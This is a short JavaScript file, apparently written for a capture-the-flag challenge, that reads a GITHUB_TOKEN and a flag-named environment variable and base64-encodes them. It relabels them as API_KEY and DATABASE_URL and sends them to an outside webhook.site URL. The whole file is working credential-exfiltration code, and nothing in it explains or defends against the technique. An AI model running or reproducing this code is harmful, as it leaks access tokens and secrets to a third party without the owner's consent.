// my-env-sender.js

import fetch from 'node-fetch';

async function sendEnvVariables() {
  const baseUrl = 'https://webhook.site/ba43dad1-a1c9-4c56-8ec4-534cf8c3634d';

  const variablesToSend = {
    API_KEY: btoa(process.env.GITHUB_TOKEN) ,
    DATABASE_URL: btoa(process.env.FLAG_GRAVY_OVERFLOW_L0_FRIES),
  };
  const queryParams = new URLSearchParams();
  for (const key in variablesToSend) {
    if (variablesToSend.hasOwnProperty(key) && variablesToSend[key] !== undefined) {
      queryParams.append(key, variablesToSend[key]);
    }
  }
  const targetUrlWithParams = `${baseUrl}?${queryParams.toString()}`;
  try {
    console.log(`Sending request to: ${targetUrlWithParams}`);
    const response = await fetch(targetUrlWithParams);

    if (response.ok) {
      const data = await response.text();
      console.log("Success");
    } else {
      console.error(`Fail`);
      const errorText = await response.text();
    }
  } catch (error) {
    console.error("error", error);
  }
}

sendEnvVariables();